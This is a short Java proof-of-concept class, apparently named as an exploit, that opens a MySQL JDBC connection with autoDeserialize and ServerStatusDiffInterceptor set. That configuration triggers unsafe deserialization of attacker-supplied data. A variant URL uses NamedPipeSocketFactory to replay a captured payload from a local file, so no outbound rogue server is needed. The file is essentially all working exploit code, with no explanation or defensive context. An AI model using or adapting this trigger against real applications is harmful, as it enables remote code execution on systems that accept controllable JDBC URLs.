package exp;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Exp {
    public static void main(String[] args) throws SQLException {
        String url = "jdbc:mysql://127.0.0.1:3307/test?autoDeserialize=yes&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=root";
        String noOutBound = "jdbc:mysql://127.0.0.1:3307/test?autoDeserialize=yes&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=root&socketFactory=com.mysql.jdbc.NamedPipeSocketFactory&namedPipePath=hex.pcap";
        String username = "root";
        String password = "root";
        try (Connection connection = DriverManager.getConnection(noOutBound, username, password)) {
            System.out.println("数据库连接成功!");
        } catch (SQLException e) {
            System.out.println("数据库连接失败!");
            e.printStackTrace();
        }
    }
}
